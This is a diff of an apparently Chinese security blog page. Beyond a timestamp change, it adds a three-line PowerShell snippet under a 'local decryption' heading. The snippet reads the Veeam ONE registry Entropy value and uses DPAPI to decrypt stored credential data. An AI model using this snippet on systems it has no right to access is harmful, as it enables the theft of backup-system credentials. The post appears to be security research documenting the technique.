@@ -15,7 +15,7 @@
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://zero-winter.github.io/assets/image-20240630004545-kf29mob.png">
 <meta property="article:published_time" content="2024-10-21T13:02:15.000Z">
-<meta property="article:modified_time" content="2024-10-21T13:24:31.846Z">
+<meta property="article:modified_time" content="2024-10-21T15:10:27.900Z">
 <meta property="article:author" content="zero-3inter">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://zero-winter.github.io/assets/image-20240630004545-kf29mob.png">
@@ -229,7 +229,7 @@
 <p>‍</p>
 <h2 id="落地代码"><a href="#落地代码" class="headerlink" title="落地代码"></a>落地代码</h2><ul>
 <li><p>本地解密</p>
-<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c#"><br></code></pre></td></tr></table></figure></li>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$data</span> = <span class="hljs-string">&quot;&lt;crypted data&gt;&quot;</span><br><span class="hljs-variable">$key</span> = [<span class="hljs-type">Convert</span>]::ToBase64String((<span class="hljs-built_in">Get-ItemPropertyValue</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&#x27;HKLM:\\SOFTWARE\\Veeam\\Veeam ONE\\Private\\&#x27;</span> <span class="hljs-literal">-Name</span> Entropy))<br><span class="hljs-built_in">Add-Type</span> <span class="hljs-literal">-AssemblyName</span> System.Security;[<span class="hljs-type">Text.Encoding</span>]::Unicode.GetString([<span class="hljs-type">Security.Cryptography.ProtectedData</span>]::Unprotect([<span class="hljs-type">Convert</span>]::FromBase64String(<span class="hljs-variable">$data</span>),[<span class="hljs-type">Convert</span>]::FromBase64String(<span class="hljs-variable">$key</span>), <span class="hljs-string">&#x27;LocalMachine&#x27;</span>))<br></code></pre></td></tr></table></figure></li>
 </ul>
 
   </div>
